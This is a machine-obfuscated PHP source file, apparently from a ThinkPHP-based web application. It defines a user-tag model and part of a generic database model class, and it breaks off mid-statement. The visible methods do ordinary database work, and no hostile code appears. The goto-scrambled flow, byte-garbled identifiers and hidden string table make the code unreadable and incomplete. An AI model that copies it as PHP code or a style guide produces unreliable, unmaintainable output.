<?php
 goto AÓæ”†ÚÈ; eÆ®Û´‘ˆ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\162\56\164\141\147\x4c\151\x73\164"; public $modelType = "\125\163\x65\x72\117\x70\x74\151\157\x6e"; public $field = array("\x6e\x61\155\145", "\163\164\x79\x6c\x65", "\163\157\x72\x74"); public function listData($b¼ËÃææ¨š = false, $föÔò„â = "\163\x6f\x72\164", $aë„…‡Î¡Ü = false) { return parent::listData($b¼ËÃææ¨š, $föÔò„â, $aë„…‡Î¡Ü); } public function remove($D‹µí’•—) { return parent::remove($D‹µí’•—); } public function add($dµ”ˆÃ¯, $A«è•ê†î = "\x6c\141\142\x65\x6c\55\147\x72\145\171\x2d\x6e\x6f\x72\x6d\x61\x6c") { $DŒãêËë§ß =& $_SERVER[¨¤¼…´]; if ($this->findByName($dµ”ˆÃ¯)) { return !1; } $F–®…¯¹ƒÈ = array($DŒãêËë§ß[398] => $dµ”ˆÃ¯, $DŒãêËë§ß[448] => $A«è•ê†î, $DŒãêËë§ß[2099] => $this->getSort($DŒãêËë§ß[259]) + 1); return parent::insert($F–®…¯¹ƒÈ); } public function update($c¤åš´‡Ê, $cİâä‡Ø¾½) { $AŸŠêÒñæÔ =& $_SERVER[¨¤¼…´]; $eÄ‰Ó‚†ëÌ = $this->listData($c¤åš´‡Ê); $B…™‡¤ò·Ÿ = $this->findByName($cİâä‡Ø¾½[$AŸŠêÒñæÔ[38]]); if (!$eÄ‰Ó‚†ëÌ || $B…™‡¤ò·Ÿ && $B…™‡¤ò·Ÿ[$AŸŠêÒñæÔ[379]] != $eÄ‰Ó‚†ëÌ[$AŸŠêÒñæÔ[379]]) { return !1; } return parent::update($c¤åš´‡Ê, $cİâä‡Ø¾½); } public function moveTop($bœŞÂ‚Ä¸·) { $bÆµóà­‰Á =& $_SERVER[¨¤¼…´]; $d’È·ÙÑéˆ = parent::listData(); $fØ¨²«» = $this->getSort($bÆµóà­‰Á[258]); foreach ($d’È·ÙÑéˆ as &$D¶ğø³´Æ) { if ($D¶ğø³´Æ[$bÆµóà­‰Á[379]] == $bœŞÂ‚Ä¸·) { $D¶ğø³´Æ[$bÆµóà­‰Á[2117]] = $fØ¨²«»; continue; } $D¶ğø³´Æ[$bÆµóà­‰Á[2117]] += 1; } unset($D¶ğø³´Æ); return parent::resetData($d’È·ÙÑéˆ); } public function moveBottom($cæÎ†Ú”É¦) { $d·˜½ŸºÀŠ =& $_SERVER[¨¤¼…´]; $e„Ùï´šê = $this->getSort($d·˜½ŸºÀŠ[259]) + 1; return parent::update($cæÎ†Ú”É¦, array($d·˜½ŸºÀŠ[2117] => $e„Ùï´šê)); } public function resetSort($aß˜áÉœÊÒ) { goto c³ĞèÚâ¹; c³ĞèÚâ¹: $BŞÈêÌª¤Ÿ =& $_SERVER[¨¤¼…´]; $Fç®ĞµÍÃ = array(); $aß˜áÉœÊÒ = is_array($aß˜áÉœÊÒ) ? $aß˜áÉœÊÒ : array(); goto A˜Ğå‘Û; A˜Ğå‘Û: for ($E…ÛŸ˜‰Œ± = 0; $E…ÛŸ˜‰Œ± < count($aß˜áÉœÊÒ); $E…ÛŸ˜‰Œ±++) { $Fç®ĞµÍÃ[$aß˜áÉœÊÒ[$E…ÛŸ˜‰Œ±] . $BŞÈêÌª¤Ÿ[43]] = $E…ÛŸ˜‰Œ± + 1; } $BÀá¶¥‚Ó = parent::listData(); foreach ($BÀá¶¥‚Ó as &$a¢Œğô£ÛÔ) { $Bæ»Ã¾¯¬ = $Fç®ĞµÍÃ[$a¢Œğô£ÛÔ[$BŞÈêÌª¤Ÿ[379]]]; $a¢Œğô£ÛÔ[$BŞÈêÌª¤Ÿ[2117]] = $Bæ»Ã¾¯¬ ? $Bæ»Ã¾¯¬ : $a¢Œğô£ÛÔ[$BŞÈêÌª¤Ÿ[2117]]; } goto cËŞŒñø½; cËŞŒñø½: unset($a¢Œğô£ÛÔ); return parent::resetData($BÀá¶¥‚Ó); goto e³çƒë‹Æ; e³çƒë‹Æ: } private function getSort($c«ãƒŒ˜ã×) { $C±òõ„‹° =& $_SERVER[¨¤¼…´]; $CˆÓ—‡Ä¼ = parent::listData(); $Fˆƒó³‘÷ = array_to_keyvalue($CˆÓ—‡Ä¼, $C±òõ„‹°[43], $C±òõ„‹°[2117]); if (!$Fˆƒó³‘÷) { $Fˆƒó³‘÷ = array(0); } $D¶ƒ§²İœ¥ = $c«ãƒŒ˜ã× == $C±òõ„‹°[259] ? max($Fˆƒó³‘÷) : min($Fˆƒó³‘÷); return intval($D¶ƒ§²İœ¥); } } goto aµËÜÎ‰Ã; eôï¤˜£¨ˆ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\x6f\x72\x64\x65\x72", "\x61\154\x69\x61\163", "\x68\141\x76\x69\156\x67", "\147\162\x6f\x75\x70", "\x6c\157\143\153", "\144\151\163\164\151\156\143\x74", "\x61\x75\x74\157", "\x66\151\154\x74\x65\162", "\166\x61\154\x69\x64\x61\164\x65", "\162\x65\163\x75\x6c\164", "\x62\x69\x6e\144", "\164\x6f\x6b\x65\x6e"); public function __construct($eœğ£òˆ¿· = '', $fæ¿ÏÌßÖ× = '', $a†‘ÛÊô¦ä = '') { $C—¹½ˆ±Ñ =& $_SERVER[¨¤¼…´]; $this->_initialize(); if (!empty($eœğ£òˆ¿·)) { if (strpos($eœğ£òˆ¿·, $C—¹½ˆ±Ñ[101])) { list($this->dbName, $this->name) = explode($C—¹½ˆ±Ñ[101], $eœğ£òˆ¿·); } else { $this->name = $eœğ£òˆ¿·; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($fæ¿ÏÌßÖ×)) { $this->tablePrefix = $C—¹½ˆ±Ñ[43]; } elseif ($C—¹½ˆ±Ñ[43] != $fæ¿ÏÌßÖ×) { $this->tablePrefix = $fæ¿ÏÌßÖ×; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($C—¹½ˆ±Ñ[245]); } $this->db(0, empty($this->connection) ? $a†‘ÛÊô¦ä : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $a°İ¼ùÏØ =& $_SERVER[¨¤¼…´]; if (empty($this->fields)) { if (think_config($a°İ¼ùÏØ[246])) { $A½¾…–¹œğ = $this->dbName ? $this->dbName : think_config($a°İ¼ùÏØ[247]); $d¦‰‘Á³ = think_var_cache($a°İ¼ùÏØ[248] . strtolower(get_path_this($A½¾…–¹œğ) . $a°İ¼ùÏØ[101] . $this->name)); if ($d¦‰‘Á³) { $cõ¿¤Ü˜®Œ = think_config($a°İ¼ùÏØ[249]); if (empty($cõ¿¤Ü˜®Œ) || $d¦‰‘Á³[$a°İ¼ùÏØ[250]] == $cõ¿¤Ü˜®Œ) { $this->fields = $d¦‰‘Á³; return; } } } $this->flush(); } } public function flush() { goto fèòá›µÀ‰; fÀ™÷ÉØ: if (!$A†´ù¬²“) { return !1; } $this->fields = array_keys($A†´ù¬²“); $this->fields[$B††í°†­—[251]] = !1; goto EÔ‚® ›„Ì; Cã£ÌÜà¯È: if (think_config($B††í°†­—[246])) { $f¿ğ¶ğ¢¶™ = $this->dbName ? $this->dbName : think_config($B††í°†­—[247]); think_var_cache($B††í°†­—[248] . strtolower(get_path_this($f¿ğ¶ğ¢¶™) . $B††í°†­—[101] . $this->name), $this->fields); } goto b—¶¢Á¼“¹; EÔ‚® ›„Ì: foreach ($A†´ù¬²“ as $D‚­™´Üíˆ => $dìÂôÅ¾‹…) { $A­…²ÌÎâ[$D‚­™´Üíˆ] = $dìÂôÅ¾‹…[$B††í°†­—[39]]; if ($dìÂôÅ¾‹…[$B††í°†­—[46]]) { $this->fields[$B††í°†­—[252]] = $D‚­™´Üíˆ; if ($dìÂôÅ¾‹…[$B††í°†­—[49]]) { $this->fields[$B††í°†­—[251]] = !0; } } } $this->fields[$B††í°†­—[253]] = $A­…²ÌÎâ; if (think_config($B††í°†­—[249])) { $this->fields[$B††í°†­—[250]] = think_config($B††í°†­—[249]); } goto Cã£ÌÜà¯È; fèòá›µÀ‰: $B††í°†­— =& $_SERVER[¨¤¼…´]; $this->db->setModel($this->name); $A†´ù¬²“ = $this->db->getFields($this->getTableName()); goto fÀ™÷ÉØ; b—¶¢Á¼“¹: } public function switchModel($F¸î»‡¦Å, $Açôá†© = array()) { $EøÄœÉ‹¼ğ =& $_SERVER[¨¤¼…´]; $a’ÎÁõ¢¬™ = ucwords(strtolower($F¸î»‡¦Å)) . $EøÄœÉ‹¼ğ[254]; if (!class_exists($a’ÎÁõ¢¬™)) { think_exception($a’ÎÁõ¢¬™ . think_lang($EøÄœÉ‹¼ğ[255])); } $this->_extModel = new $a’ÎÁõ¢¬™($this->name); if (!empty($Açôá†©)) { foreach ($Açôá†© as $c ãêËÒÈ) { $this->_extModel->setProperty($c ãêËÒÈ, $this->{$c ãêËÒÈ}); } } return $this->_extModel; } public function __set($eäå˜„¤ÊÍ, $DÕ«ÚŞĞ³‚) { $this->data[$eäå˜„¤ÊÍ] = $DÕ«ÚŞĞ³‚; } public function __get($D©·¡¢æ¨Ì) { return isset($this->data[$D©·¡¢æ¨Ì]) ? $this->data[$D©·¡¢æ¨Ì] : null; } public function __isset($b„…óäİ«Å) { return isset($this->data[$b„…óäİ«Å]); } public function __unset($F˜ŠòÜŠŠò) { unset($this->data[$F˜ŠòÜŠŠò]); } public function __call($fºˆ«‡ä•Ä, $b¡È¦À–ŒŠ) { $E‡¸È×µó¥ =& $_SERVER[¨¤¼…´]; if (in_array(strtolower($fºˆ«‡ä•Ä), $this->methods, !0)) { $this->options[strtolower($fºˆ«‡ä•Ä)] = $b¡È¦À–ŒŠ[0]; return $this; } elseif (in_array(strtolower($fºˆ«‡ä•Ä), array($E‡¸È×µó¥[256], $E‡¸È×µó¥[257], $E‡¸È×µó¥[258], $E‡¸È×µó¥[259], $E‡¸È×µó¥[260]), !0)) { $A»ÕÊİêË‡ = isset($b¡È¦À–ŒŠ[0]) ? $b¡È¦À–ŒŠ[0] : $E‡¸È×µó¥[190]; $A»ÕÊİêË‡ = $this->db->parseKey($A»ÕÊİêË‡); return $this->getField(strtoupper($fºˆ«‡ä•Ä) . $E‡¸È×µó¥[261] . $A»ÕÊİêË‡ . $E‡¸È×µó¥[262] . $fºˆ«‡ä•Ä, $E‡¸È×µó¥[256]); } elseif (strtolower(substr($fºˆ«‡ä•Ä, 0, 5)) == $E‡¸È×µó¥[263]) { $A»ÕÊİêË‡ = think_parse_name(substr($fºˆ«‡ä•Ä, 5)); $E‚½¥ËŠº[$A»ÕÊİêË‡] = $b¡È¦À–ŒŠ[0]; return $this->where($E‚½¥ËŠº)->find(); } elseif (strtolower(substr($fºˆ«‡ä•Ä, 0, 10)) == $E‡¸È×µó¥[264]) { $eĞ ŞƒìÓ— = think_parse_name(substr($fºˆ«‡ä•Ä, 10)); $E‚½¥ËŠº[$eĞ ŞƒìÓ—] = $b¡È¦À–ŒŠ[0]; return $this->where($E‚½¥ËŠº)->getField($b¡È¦À–ŒŠ[1]); } elseif (isset($this->_scope[$fºˆ«‡ä•Ä])) { return $this->scope($fºˆ«‡ä•Ä, $b¡È¦À–ŒŠ[0]); } elseif (method_exists($this, $fºˆ«‡ä•Ä)) { array_unshift($b¡È¦À–ŒŠ, $fºˆ«‡ä•Ä); return call_user_func_array(array($this, $E‡¸È×µó¥[265]), $b¡È¦À–ŒŠ); } else { return call_user_func_array(array(parent, $fºˆ«‡ä•Ä), $b¡È¦À–ŒŠ); } } protected function call() { goto E¹ˆ¢êšÊ¶; E¹ˆ¢êšÊ¶: $aâ¤¸²‡¶ =& $_SERVER[¨¤¼…´]; $CÜºÑòì = func_get_args(); $FÌÓ¾Š½‘å = array_shift($CÜºÑòì); goto DÄ¦ Æôöî; DÄ¦ Æôöî: $a†õîÓˆ²Û = $FÌÓ¾Š½‘å; if (is_array($FÌÓ¾Š½‘å)) { $a†õîÓˆ²Û = $FÌÓ¾Š½‘å[1]; $FÌÓ¾Š½‘å = $FÌÓ¾Š½‘å[0]; } $Eâê”©§Á“ = count($CÜºÑòì) - 1; goto Bè¢Š‘ù­ì; Bè¢Š‘ù­ì: if (isset($CÜºÑòì[$Eâê”©§Á“]) && $CÜºÑòì[$Eâê”©§Á“] === $FÌÓ¾Š½‘å) { think_exception(__CLASS__ . $aâ¤¸²‡¶[4] . $FÌÓ¾Š½‘å . think_lang($aâ¤¸²‡¶[266])); return; } $CÜºÑòì[] = $FÌÓ¾Š½‘å; if (method_exists($this, $aâ¤¸²‡¶[267])) { $dÚëÜ¦¤œŒ = call_user_func_array(array($this, $aâ¤¸²‡¶[268]), array($a†õîÓˆ²Û, $CÜºÑòì)); if (!is_null($dÚëÜ¦¤œŒ) && $dÚëÜ¦¤œŒ !== !1) { return $dÚëÜ¦¤œŒ; } } goto E‘Û¡İİ…¦; E‘Û¡İİ…¦: $BÚĞêóù¥§ = call_user_func_array(array($this, $FÌÓ¾Š½‘å), $CÜºÑòì); if (method_exists($this, $aâ¤¸²‡¶[269])) { $dÚëÜ¦¤œŒ = call_user_func_array(array($this, $aâ¤¸²‡¶[270]), array($a†õîÓˆ²Û, $CÜºÑòì, $BÚĞêóù¥§)); if ($dÚëÜ¦¤œŒ) { return $dÚëÜ¦¤œŒ; } } return $BÚĞêóù¥§; goto eŞ•ÀäÔæ; eŞ•ÀäÔæ: } protected function _initialize() { } protected function _facade($fß™Èò…Ğ) { $cÙê¸…çÎõ =& $_SERVER[¨¤¼…´]; if (!empty($this->fields)) { foreach ($fß™Èò…Ğ as $aÉÎ½…á‡Û => $aÍ‰Ú…““) { if (!in_array($aÉÎ½…á‡Û, $this->fields, !0)) { unset($fß™Èò…Ğ[$aÉÎ½…á‡Û]); } elseif (is_scalar($aÍ‰Ú…““)) { $this->_parseType($fß™Èò…Ğ, $aÉÎ½…á‡Û); } } } if (!empty($this->options[$cÙê¸…çÎõ[271]])) { $fß™Èò…Ğ = array_map($this->options[$cÙê¸…çÎõ[271]], $fß™Èò…Ğ); unset($this->options[$cÙê¸…çÎõ[271]]); } $this->_beforeWrite($fß™Èò…Ğ); return $fß™Èò…Ğ; } protected function _beforeWrite(&$bääÛßŞ£) { } public function add($dêÏ¸¨æ®Ê = '', $F»±İİë‚Œ = array(), $f—´³†Ö× = false) { goto f ÒÖö¤‚Ø; C¬Â‰ë‡Ú‡: if (!1 === $this->_beforeInsert($dêÏ¸¨æ®Ê, $F»±İİë‚Œ)) { return !1; } $d”Û¨©¡§ù = $this->db->insert($dêÏ¸¨æ®Ê, $F»±İİë‚Œ, $f—´³†Ö×); if (!1 !== $d”Û¨©¡§ù) { $fÕÌ…ƒÓø = $this->getLastInsID(); if ($fÕÌ…ƒÓø) { $dêÏ¸¨æ®Ê[$this->getPk()] = $fÕÌ…ƒÓø; $this->_after_insert($dêÏ¸¨æ®Ê, $F»±İİë‚Œ); return $fÕÌ…ƒÓø; } $this->_after_insert($dêÏ¸¨æ®Ê, $F»±İİë‚Œ); } goto bÏÆÂÏŠÄ†; f ÒÖö¤‚Ø: if (empty($dêÏ¸¨æ®Ê)) { if (!empty($this->data)) { $dêÏ¸¨æ®Ê = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¨¤¼…´][272]); return !1; } } $F»±İİë‚Œ = $this->_parseOptions($F»±İİë‚Œ); $dêÏ¸¨æ®Ê = $this->_facade($dêÏ¸¨æ®Ê); goto C¬Â‰ë‡Ú‡; bÏÆÂÏŠÄ†: return $d”Û¨©¡§ù; goto F·ÆÂÖ¸¬á; F·ÆÂÖ¸¬á: } protected function _beforeInsert(&$DîİãÜâ—, $c—î“«×ö±) { } protected function _after_insert($D¾ñï©À®, $dÀ´‰Ø‚¸œ) { } public function addAll($c¢ğĞë†œ, $a‘Ü†§­ ô = array(), $C ®±¹¬Ùƒ = false) { goto c“Ìà ‰; c“Ìà ‰: $cšæÂ–ÙÕ =& $_SERVER[¨¤¼…´]; if (empty($c¢ğĞë†œ)) { $this->error = think_lang($cšæÂ–ÙÕ[272]); return !1; } $a‘Ü†§­ ô = $this->_parseOptions($a‘Ü†§­ ô); goto eîÔæŒ¼; eîÔæŒ¼: foreach ($c¢ğĞë†œ as $bîÉ–¯ƒğ‚ => $cŠ„›—ï¥ä) { $c¢ğĞë†œ[$bîÉ–¯ƒğ‚] = $this->_facade($cŠ„›—ï¥ä); } if (method_exists($this->db, $cšæÂ–ÙÕ[273])) { $BìÕ–Ïä‘ = $this->db->insertAll($c¢ğĞë†œ, $a‘Ü†§­ ô, $C ®±¹¬Ùƒ); } else { $this->startTrans(); foreach ($c¢ğĞë†œ as $bîÉ–¯ƒğ‚ => $cŠ„›—ï¥ä) { $BìÕ–Ïä‘ = $this->db->insert($cŠ„›—ï¥ä, $a‘Ü†§­ ô, $C ®±¹¬Ùƒ); } $this->commit(); } if (!1 !== $BìÕ–Ïä‘) { $fÆ¤›Â¿î® = $this->getLastInsID(); if ($fÆ¤›Â¿î®) { return $fÆ¤›Â¿î®; } } goto a†¯«îÑ†; a†¯«îÑ†: return $BìÕ–Ïä‘; goto ašçˆ‰ß‚‰; ašçˆ‰ß‚‰: } public function selectAdd($E´Ó§è‡ùø = '', $d›”Ş²ñ‹¯ = '', $Fƒ‘„„¿Ÿ = array()) { $d‰Ëæ§¬æ =& $_SERVER[¨¤¼…´]; $Fƒ‘„„¿Ÿ = $this->_parseOptions($Fƒ‘„„¿Ÿ); if (!1 === ($bÚË«±«Í° = $this->db->selectInsert($E´Ó§è‡ùø ? $E´Ó§è‡ùø : $Fƒ‘„„¿Ÿ[$d‰Ëæ§¬æ[274]], $d›”Ş²ñ‹¯ ? $d›”Ş²ñ‹¯ : $this->getTableName(), $Fƒ‘„„¿Ÿ))) { $this->error = think_lang($d‰Ëæ§¬æ[275]); return !1; } else { return $bÚË«±«Í°; } } public function save($aŸ¯ìâ¿Ô = '', $b¨–ÀåÊ¶è = array()) { goto AÔÅÚ‚ÚÈ; e©ÓœÅĞ¶×: if (is_array($b¨–ÀåÊ¶è[$d¦îñ¨‘Ú[276]]) && isset($b¨–ÀåÊ¶è[$d¦îñ¨‘Ú[276]][$F‘‘Ù”»¤¯])) { $b±ñß†å = $b¨–ÀåÊ¶è[$d¦îñ¨‘Ú[276]][$F‘‘Ù”»¤¯]; } if (!1 === $this->_beforeUpdate($aŸ¯ìâ¿Ô, $b¨–ÀåÊ¶è)) { return !1; } $dƒå²Üƒ¿º = $this->db->update($aŸ¯ìâ¿Ô, $b¨–ÀåÊ¶è); goto eó¦ˆÄŸÚ; AÔÅÚ‚ÚÈ: $d¦îñ¨‘Ú =& $_SERVER[¨¤¼…´]; if (empty($aŸ¯ìâ¿Ô)) { if (!empty($this->data)) { $aŸ¯ìâ¿Ô = $this->data; $this->data = array(); } else { $this->error = think_lang($d¦îñ¨‘Ú[272]); return !1; } } $aŸ¯ìâ¿Ô = $this->_facade($aŸ¯ìâ¿Ô); goto A‘ÊĞ—ÉÎÖ; eó¦ˆÄŸÚ: if (!1 !== $dƒå²Üƒ¿º) { if (isset($b±ñß†å)) { $aŸ¯ìâ¿Ô[$F‘‘Ù”»¤¯] = $b±ñß†å; } $this->_afterUpdate($aŸ¯ìâ¿Ô, $b¨–ÀåÊ¶è); } return $dƒå²Üƒ¿º; goto fË´‰ÎÚìğ; A‘ÊĞ—ÉÎÖ: $b¨–ÀåÊ¶è = $this->_parseOptions($b¨–ÀåÊ¶è); $F‘‘Ù”»¤¯ = $this->getPk(); if (!isset($b¨–ÀåÊ¶è[$d¦îñ¨‘Ú[276]])) { if (isset($aŸ¯ìâ¿Ô[$F‘‘Ù”»¤¯])) { $F…æ–¦Š­‹[$F‘‘Ù”»¤¯] = $aŸ¯ìâ¿Ô[$F‘‘Ù”»¤¯]; $b¨–ÀåÊ¶è[$d¦îñ¨‘Ú[276]] = $F…æ–¦Š­‹; unset($aŸ¯ìâ¿Ô[$F‘‘Ù”»¤¯]); } else { $this->error = think_lang($d¦îñ¨‘Ú[275]); return !1; } } goto e©ÓœÅĞ¶×; fË´‰ÎÚìğ: } protected function _beforeUpdate(&$aİ¿¢§åÆâ, $D¬Ú™Ô¾) { } protected function _afterUpdate($DÖ¯±ÉÏ¡É, $F´‹°Ş×ä“) { } public function delete($eµõÆ‘àå = array()) { goto e÷çñÆ³·; CÖØÈÊù: if (is_numeric($eµõÆ‘àå) || is_string($eµõÆ‘àå)) { if (strpos($eµõÆ‘àå, $D¸˜®øĞ´[57])) { $B³¦ÌÄˆÕÖ[$a‡Î³±ÏŸ®] = array($D¸˜®øĞ´[277], $eµõÆ‘àå); } else { $B³¦ÌÄˆÕÖ[$a‡Î³±ÏŸ®] = $eµõÆ‘àå; } $this->options[$D¸˜®øĞ´[276]] = $B³¦ÌÄˆÕÖ; } $eµõÆ‘àå = $this->_parseOptions(); if (is_array($eµõÆ‘àå[$D¸˜®øĞ´[276]]) && isset($eµõÆ‘àå[$D¸˜®øĞ´[276]][$a‡Î³±ÏŸ®])) { $b‰”¿“äëî = $eµõÆ‘àå[$D¸˜®øĞ´[276]][$a‡Î³±ÏŸ®]; } goto C†·¸Ä“¤É; C†·¸Ä“¤É: $Fø‡ïÀÜí = $this->db->delete($eµõÆ‘àå); if (!1 !== $Fø‡ïÀÜí) { $EÁ‡‘§š¤× = array(); if (isset($b‰”¿“äëî)) { $EÁ‡‘§š¤×[$a‡Î³±ÏŸ®] = $b‰”¿“äëî; } $this->_after_delete($EÁ‡‘§š¤×, $eµõÆ‘àå); } return $Fø‡ïÀÜí; goto f¿«ÊÆ×¶; e÷çñÆ³·: $D¸˜®øĞ´ =& $_SERVER[¨¤¼…´]; if (empty($eµõÆ‘àå) && empty($this->options[$D¸˜®øĞ´[276]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $a‡Î³±ÏŸ® = $this->getPk(); goto CÖØÈÊù; f¿«ÊÆ×¶: } protected function _after_delete($fˆ‚¶²ÌƒÜ, $Fòš‹í×™) { } public function select($eîÏ¥¤ë›÷ = array()) { goto A¶ÏÈ­¸ìğ; A¶ÏÈ­¸ìğ: $a¼ˆ”ºó =& $_SERVER[¨¤¼…´]; if (is_string($eîÏ¥¤ë›÷) || is_numeric($eîÏ¥¤ë›÷)) { $c¼¬ÁµŠ¡º = $this->getPk(); if (strpos($eîÏ¥¤ë›÷, $a¼ˆ”ºó[57])) { $Cğ½‘‡Ñç«[$c¼¬ÁµŠ¡º] = array($a¼ˆ”ºó[277], $eîÏ¥¤ë›÷); } else { $Cğ½‘‡Ñç«[$c¼¬ÁµŠ¡º] = $eîÏ¥¤ë›÷; } $this->options[$a¼ˆ”ºó[276]] = $Cğ½‘‡Ñç«; } elseif (!1 === $eîÏ¥¤ë›÷) { $eîÏ¥¤ë›÷ = $this->_parseOptions(); return $a¼ˆ”ºó[278] . $this->db->buildSelectSql($eîÏ¥¤ë›÷) . $a¼ˆ”ºó[279]; } $eîÏ¥¤ë›÷ = $this->_parseOptions(); goto a¤ìøºÛ“¦; a¤ìøºÛ“¦: $b¯’ƒ¿‰‡ = $this->db->select($eîÏ¥¤ë›÷); if (!1 === $b¯’ƒ¿‰‡) { return !1; } if (empty($b¯’ƒ¿‰‡)) { return null; } goto fÒã‚…Ï÷“; fÒã‚…Ï÷“: $this->_afterSelect($b¯’ƒ¿‰‡, $eîÏ¥¤ë›÷); return $b¯’ƒ¿‰‡; goto a®åõùÃĞÀ; a®åõùÃĞÀ: } protected function _afterSelect(&$Cóº¯©®ƒÔ, $BŒÑíÃ¸Ğè) { } public function buildSql($Dˆ°»çõî‚ = array()) { $BÈğ¤ÙÈæ¬ =& $_SERVER[¨¤¼…´]; $Dˆ°»çõî‚ = $this->_parseOptions($Dˆ°»çõî‚); return $BÈğ¤ÙÈæ¬[278] . $this->db->buildSelectSql($Dˆ°»çõî‚) . $BÈğ¤ÙÈæ¬[279]; } public function optionsValue($D¦òÚø‡İ = null) { if (is_null($D¦òÚø‡İ)) { return $this->options; } elseif (is_array($D¦òÚø‡İ)) { $this->options = array_merge($this->options, $D¦òÚø‡İ); } } protected function _parseOptions($c¹®¶—ëñ… = array()) { goto bÃÒË¨ÎŠœ; F„×£ã› è: if (!isset($c¹®¶—ëñ…[$e·³Ş­³ä[280]])) { $c¹®¶—ëñ…[$e·³Ş­³ä[280]] = $this->getTableName(); $FÄÓ†£ÚÁ = $this->fields; } else { $FÄÓ†£ÚÁ = $this->getDbFields(); } if (!empty($c¹®¶—ëñ…[$e·³Ş­³ä[281]])) { $c¹®¶—ëñ…[$e·³Ş­³ä[280]] .= $e·³Ş­³ä[60] . $c¹®¶—ëñ…[$e·³Ş­³ä[281]]; } $c¹®¶—ëñ…[$e·³Ş­³ä[282]] = $this->name; goto F„‡¼‘ŸÁà; F„‡¼‘ŸÁà: if (isset($c¹®¶—ëñ…[$e·³Ş­³ä[276]]) && is_array($c¹®¶—ëñ…[$e·³Ş­³ä[276]]) && !empty($FÄÓ†£ÚÁ) && !isset($c¹®¶—ëñ…[$e·³Ş­³ä[283]]) && !isset($c¹®¶—ëñ…[$e·³Ş­³ä[280]])) { foreach ($c¹®¶—ëñ…[$e·³Ş­³ä[276]] as $FÍŠ»šË¨Ë => $aÁ‘……—ˆ) { $FÍŠ»šË¨Ë = trim($FÍŠ»šË¨Ë); if (in_array($FÍŠ»šË¨Ë, $FÄÓ†£ÚÁ, !0)) { if (is_scalar($aÁ‘……—ˆ)) { $this->_parseType($c¹®¶—ëñ…[$e·³Ş­³ä[276]], $FÍŠ»šË¨Ë); } } elseif (!is_numeric($FÍŠ»šË¨Ë) && $e·³Ş­³ä[80] != substr($FÍŠ»šË¨Ë, 0, 1) && !1 === strpos($FÍŠ»šË¨Ë, $e·³Ş­³ä[101]) && !1 === strpos($FÍŠ»šË¨Ë, $e·³Ş­³ä[261]) && !1 === strpos($FÍŠ»šË¨Ë, $e·³Ş­³ä[284]) && !1 === strpos($FÍŠ»šË¨Ë, $e·³Ş­³ä[285])) { unset($c¹®¶—ëñ…[$e·³Ş­³ä[276]][$FÍŠ»šË¨Ë]); } } } $this->_options_filter($c¹®¶—ëñ…); return $c¹®¶—ëñ…; goto bî‚½Ù‚„Ù; bÃÒË¨ÎŠœ: $e·³Ş­³ä =& $_SERVER[¨¤¼…´]; if (is_array($c¹®¶—ëñ…)) { $c¹®¶—ëñ… = array_merge($this->options, $c¹®¶—ëñ…); } $this->options = array(); goto F„×£ã› è; bî‚½Ù‚„Ù: } protected function _options_filter(&$CÈ¾—¢º•ğ) { } protected function _parseType(&$eÜ‰£æ±‰, $B½¥á£ºä) { $a¦­«ïÏÅô =& $_SERVER[¨¤¼…´]; if (empty($this->options[$a¦­«ïÏÅô[286]][$a¦­«ïÏÅô[4] . $B½¥á£ºä])) { $B°ã›÷©–¦ = strtolower($this->fields[$a¦­«ïÏÅô[253]][$B½¥á£ºä]); if (!1 !== strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[287])) { } elseif (!1 === strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[288]) && !1 !== strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[289])) { $eÜ‰£æ±‰[$B½¥á£ºä] = intval($eÜ‰£æ±‰[$B½¥á£ºä]); } elseif (!1 !== strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[290]) || !1 !== strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[291])) { $eÜ‰£æ±‰[$B½¥á£ºä] = floatval($eÜ‰£æ±‰[$B½¥á£ºä]); } elseif (!1 !== strpos($B°ã›÷©–¦, $a¦­«ïÏÅô[292])) { $eÜ‰£æ±‰[$B½¥á£ºä] = (bool) $eÜ‰£æ±‰[$B½¥á£ºä]; } } } public function find($cáìèœ™½ = array()) { goto cÖØ“˜éà; cÖØ“˜éà: $aµ®ˆ¥¸ùŠ =& $_SERVER[¨¤¼…´]; if (is_numeric($cáìèœ™½) || is_string($cáìèœ™½)) { $Bª–»ÈçÂ¶[$this->getPk()] = intval($cáìèœ™½); $this->options[$aµ®ˆ¥¸ùŠ[276]] = $Bª–»ÈçÂ¶; } $this->options[$aµ®ˆ¥¸ùŠ[293]] = 1; goto fìÎ‚ïä•; CÆ·ÁëèÜ±: if (empty($c¸ª¢ÈÀ›Á)) { return null; } $this->data = $c¸ª¢ÈÀ›Á[0]; $this->_afterFind($this->data, $cáìèœ™½); goto bÁ¾‹¸Ù©‡; fìÎ‚ïä•: $cáìèœ™½ = $this->_parseOptions(); $c¸ª¢ÈÀ›Á = $this->db->select($cáìèœ™½); if (!1 === $c¸ª¢ÈÀ›Á) { return !1; } goto CÆ·ÁëèÜ±; bÁ¾‹¸Ù©‡: if (!empty($this->options[$aµ®ˆ¥¸ùŠ[294]])) { return $this->returnResult($this->data, $this->options[$aµ®ˆ¥¸ùŠ[294]]); } return $this->data; goto F­”˜‡ÙÖ; F­”˜‡ÙÖ: } protected function _afterFind(&$aËªØÏ‹š, $a¼é‚–º˜ù) { } protected function returnResult($Fµµ«ÔÉçæ, $f•æÜÙßØ¸ = '') { $Cºøªî‹¨ë =& $_SERVER[¨¤¼…´]; if ($f•æÜÙßØ¸) { if (is_callable($f•æÜÙßØ¸)) { return call_user_func($f•æÜÙßØ¸, $Fµµ«ÔÉçæ); } switch 